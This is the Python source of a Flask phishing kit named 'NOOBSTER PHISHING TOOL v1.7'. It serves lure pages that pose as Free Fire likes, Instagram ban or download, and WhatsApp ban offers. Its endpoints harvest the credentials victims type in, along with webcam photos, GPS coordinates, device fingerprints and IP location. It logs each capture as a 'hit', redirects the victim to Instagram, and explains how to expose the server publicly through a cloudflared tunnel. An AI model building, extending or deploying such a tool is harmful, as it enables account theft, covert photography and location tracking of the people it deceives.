"""
NOOBSTER PHISHING TOOL v1.7
Local mode — no tunnel. Expose yourself with cloudflared.
Telegram: https://t.me/noob11001
"""

import os, json, time, base64, re, sys
from datetime import datetime
from flask import Flask, render_template, request, jsonify, abort

app = Flask(__name__)
CAPTURE_DIR = "captures"
os.makedirs(CAPTURE_DIR, exist_ok=True)
TELEGRAM = "https://t.me/noob11001"
STATE = {"active_page": None}


class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
    M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; D = "\033[90m"
    BOLD = "\033[1m"; N = "\033[0m"


BANNER = r"""
╔══════════════════════════════════════════════════════════════╗
║    ███╗   ██╗ ██████╗  ██████╗ ██████╗ ███████╗████████╗     ║
║    ████╗  ██║██╔═══██╗██╔═══██╗██╔══██╗██╔════╝╚══██╔══╝     ║
║    ██╔██╗ ██║██║   ██║██║   ██║██████╔╝███████╗   ██║        ║
║    ██║╚██╗██║██║   ██║██║   ██║██╔══██╗╚════██║   ██║        ║
║    ██║ ╚████║╚██████╔╝╚██████╔╝██████╔╝███████║   ██║        ║
║    ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝        ║
║              P H I S H I N G   T O O L   v1.7                ║
║                  LOCAL MODE — no tunnel                      ║
║                  t.me/noob11001                              ║
╚══════════════════════════════════════════════════════════════╝
"""


PAGES = {
    "1": {"slug": "freefire", "name": "Free Fire Likes", "icon": "🎮", "template": "freefire.html"},
    "2": {"slug": "instagram-ban", "name": "Instagram Ban", "icon": "📵", "template": "ig_ban.html"},
    "3": {"slug": "instagram-download", "name": "IG Private Download", "icon": "📥", "template": "ig_download.html"},
    "4": {"slug": "whatsapp-ban", "name": "WhatsApp Ban", "icon": "💬", "template": "wa_ban.html"},
}
SLUG_TO_PAGE = {p["slug"]: p for p in PAGES.values()}


def parse_device(ua):
    if not ua:
        return {"model": "unknown", "os": "unknown", "browser": "unknown", "type": "unknown"}
    info = {"model": "unknown", "os": "unknown", "browser": "unknown", "type": "unknown"}
    info["type"] = "mobile" if re.search(r"Mobile|Android|iPhone|iPad|iPod", ua) else "desktop"
    if "Android" in ua:
        m = re.search(r"Android\s+([\d.]+)", ua)
        info["os"] = f"Android {m.group(1)}" if m else "Android"
        m2 = re.search(r"Android[^;]*;\s*([^;)]+?)(?:\s+Build|\))", ua)
        if m2:
            info["model"] = m2.group(1).strip()
    elif "iPhone" in ua:
        info["os"] = "iOS"; info["model"] = "iPhone"
        m = re.search(r"OS\s+(\d+_\d+)", ua)
        if m:
            info["os"] = f"iOS {m.group(1).replace('_', '.')}"
    elif "iPad" in ua:
        info["os"] = "iPadOS"; info["model"] = "iPad"
    elif "Windows" in ua:
        info["os"] = "Windows"; info["model"] = "PC"
    elif "Mac OS X" in ua:
        info["os"] = "macOS"; info["model"] = "Mac"
    elif "Linux" in ua:
        info["os"] = "Linux"; info["model"] = "PC"
    for name, tag in [("Edge", "Edg/"), ("Chrome", "Chrome/"), ("Firefox", "Firefox/"),
                      ("Safari", "Safari/"), ("Opera", "OPR/"), ("Samsung Internet", "SamsungBrowser/")]:
        if tag in ua:
            info["browser"] = name
            break
    return info


def new_folder(ip, page):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_ip = re.sub(r"[^a-zA-Z0-9_.-]", "_", ip or "unknown")
    safe_page = re.sub(r"[^a-zA-Z0-9_-]", "_", page or "unknown")
    folder = os.path.join(CAPTURE_DIR, f"{ts}_{safe_page}_{safe_ip}")
    os.makedirs(folder, exist_ok=True)
    return folder


def save_json(folder, name, data):
    with open(os.path.join(folder, name), "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


def header(ip, ua, page):
    dev = parse_device(ua)
    print(f"\n{C.BOLD}{C.M}{'═' * 66}{C.N}")
    print(f"{C.BOLD}{C.G}  🎯 NEW HIT{C.N}   {C.D}{datetime.now().strftime('%H:%M:%S')}{C.N}")
    print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}")
    print(f"  {C.C}Page    :{C.N} {C.W}{page}{C.N}")
    print(f"  {C.C}IP      :{C.N} {C.Y}{ip}{C.N}")
    print(f"  {C.C}Device  :{C.N} {C.W}{dev['model']}{C.N}  {C.D}({dev['type']}){C.N}")
    print(f"  {C.C}OS      :{C.N} {C.W}{dev['os']}{C.N}  {C.D}| {dev['browser']}{C.N}")


def footer():
    print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}\n")


@app.route("/")
def root():
    return serve_selected()


@app.route("/<path:path>")
def catch_all(path):
    if path == STATE["active_page"]:
        return serve_selected()
    if path.startswith("static/"):
        return app.send_static_file(path[7:])
    abort(404)


def serve_selected():
    slug = STATE["active_page"]
    if not slug:
        abort(503)
    page = SLUG_TO_PAGE.get(slug)
    if not page:
        abort(503)
    return render_template(page["template"], telegram=TELEGRAM)


@app.route("/capture/photo", methods=["POST"])
def cap_photo():
    if not STATE["active_page"]:
        abort(404)
    d = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    folder = new_folder(ip, d.get("page", "?"))
    b64 = d.get("photo", "")
    if "," in b64:
        b64 = b64.split(",", 1)[1]
    try:
        with open(os.path.join(folder, "photo.jpg"), "wb") as f:
            f.write(base64.b64decode(b64))
        print(f"  {C.G}📸 Photo saved{C.N}  {C.D}{folder}/photo.jpg{C.N}")
    except Exception as e:
        print(f"  {C.R}photo error: {e}{C.N}")
    save_json(folder, "meta.json", {
        "timestamp": datetime.now().isoformat(), "ip": ip,
        "user_agent": ua, "device": parse_device(ua), "page": d.get("page", "?")
    })
    return jsonify({"ok": 1})


@app.route("/capture/fingerprint", methods=["POST"])
def cap_fp():
    if not STATE["active_page"]:
        abort(404)
    d = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    page = d.get("page", "?")
    folder = new_folder(ip, page)
    save_json(folder, "fingerprint.json", {
        "timestamp": datetime.now().isoformat(), "ip": ip, "ua": ua, "data": d
    })
    if "screen" in d:
        bat = d.get("battery") or {}
        conn = d.get("connection") or {}
        gpu = d.get("gpu") or {}
        header(ip, ua, page)
        print(f"  {C.C}Screen  :{C.N} {d.get('screen', {}).get('width', '?')}x"
              f"{d.get('screen', {}).get('height', '?')}  "
              f"{C.D}@{d.get('screen', {}).get('pixelRatio', '?')}x{C.N}")
        print(f"  {C.C}Lang    :{C.N} {d.get('language', '?')}  "
              f"{C.D}| TZ: {d.get('timezone', '?')}{C.N}")
        if bat:
            pct = int((bat.get("level") or 0) * 100)
            chg = "⚡ charging" if bat.get("charging") else "🔋"
            print(f"  {C.C}Battery :{C.N} {C.Y}{pct}%{C.N} {chg}")
        if gpu:
            print(f"  {C.C}GPU     :{C.N} {gpu.get('renderer', '?')[:50]}")
        if conn:
            print(f"  {C.C}Network :{C.N} {conn.get('effectiveType', '?')} "
                  f"{C.D}({conn.get('downlink', '?')}Mbps, {conn.get('rtt', '?')}ms){C.N}")
        print(f"  {C.C}CPU     :{C.N} {d.get('hardwareConcurrency', '?')} cores  "
              f"{C.D}RAM: {d.get('deviceMemory', '?')}GB{C.N}")
    if "ipapi" in d:
        api = d["ipapi"]
        print(f"  {C.C}Country :{C.N} {api.get('country_name', '?')} ({api.get('country_code', '?')})")
        print(f"  {C.C}City    :{C.N} {api.get('city', '?')}, {api.get('region', '?')}")
        print(f"  {C.C}ISP     :{C.N} {api.get('org', '?')}")
        footer()
    return jsonify({"ok": 1})


@app.route("/capture/location", methods=["POST"])
def cap_loc():
    if not STATE["active_page"]:
        abort(404)
    d = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    folder = new_folder(ip, d.get("page", "?"))
    save_json(folder, "location.json", {
        "timestamp": datetime.now().isoformat(), "ip": ip, "location": d
    })
    lat = d.get("lat"); lon = d.get("lon")
    if lat is not None:
        print(f"  {C.G}📍 Location{C.N}  https://maps.google.com/?q={lat},{lon}  "
              f"{C.D}(±{int(d.get('accuracy', 0))}m){C.N}")
    return jsonify({"ok": 1})


@app.route("/capture/credentials", methods=["POST"])
def cap_creds():
    if not STATE["active_page"]:
        abort(404)
    d = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    page = d.get("page", "?")
    folder = new_folder(ip, page)
    save_json(folder, "credentials.json", {
        "timestamp": datetime.now().isoformat(), "ip": ip, "ua": ua,
        "page": page, "fields": d.get("fields", {})
    })
    print(f"  {C.BOLD}{C.R}🔑 CAPTURED INPUT{C.N}  {C.D}page: {page}{C.N}")
    for k, v in (d.get("fields") or {}).items():
        s = str(v)
        shown = s if len(s) < 60 else s[:57] + "..."
        print(f"     {C.C}{k}{C.N} = {C.Y}{shown}{C.N}")
    footer()
    return jsonify({"ok": 1, "redirect": d.get("redirect", "https://www.instagram.com")})


def show_menu():
    os.system("clear" if os.name == "posix" else "cls")
    print(BANNER)
    print(f"  {C.D}Telegram:{C.N} {C.C}{TELEGRAM}{C.N}\n")
    print(f"{C.BOLD}{C.W}  SELECT A MODULE  {C.D}(only this one goes live){C.N}\n")
    for k, p in PAGES.items():
        print(f"   {C.BOLD}{C.Y}[{k}]{C.N}  {p['icon']}  {C.W}{p['name']}{C.N}")
    print(f"\n   {C.BOLD}{C.Y}[0]{C.N}  🚀  {C.W}Start server{C.N}")
    print(f"   {C.BOLD}{C.Y}[q]{C.N}  ❌  {C.W}Quit{C.N}\n")
    while True:
        try:
            choice = input(f"{C.BOLD}{C.C}  ▸ select: {C.N}").strip().lower()
        except (EOFError, KeyboardInterrupt):
            sys.exit(0)
        if choice == "q":
            print(f"\n{C.D}bye.{C.N}\n")
            sys.exit(0)
        if choice in PAGES:
            STATE["active_page"] = PAGES[choice]["slug"]
            p = PAGES[choice]
            print(f"\n  {C.G}✓ selected:{C.N} {p['icon']} {C.W}{p['name']}{C.N}")
            print(f"  {C.D}Press 0 to start.{C.N}\n")
            continue
        if choice == "0":
            if not STATE["active_page"]:
                print(f"  {C.R}pick a module first.{C.N}\n")
                continue
            print(f"\n  {C.G}starting server...{C.N}\n")
            return
        print(f"  {C.R}invalid.{C.N}")


def boot():
    show_menu()
    slug = STATE["active_page"]
    p = SLUG_TO_PAGE[slug]
    print(f"\n{C.BOLD}{C.M}{'═' * 66}{C.N}")
    print(f"{C.BOLD}{C.G}  🎯 ACTIVE PAGE: {p['icon']}  {p['name']}{C.N}")
    print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}")
    print(f"  {C.C}Local   :{C.N} {C.W}http://127.0.0.1:5000/{p['slug']}{C.N}")
    print(f"  {C.C}Root    :{C.N} {C.W}http://127.0.0.1:5000/{C.N}")
    print(f"  {C.C}Expose  :{C.N} {C.D}cloudflared tunnel --url http://localhost:5000{C.N}")
    print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}\n")
    app.run(host="0.0.0.0", port=5000, debug=False)


if __name__ == "__main__":
    boot()
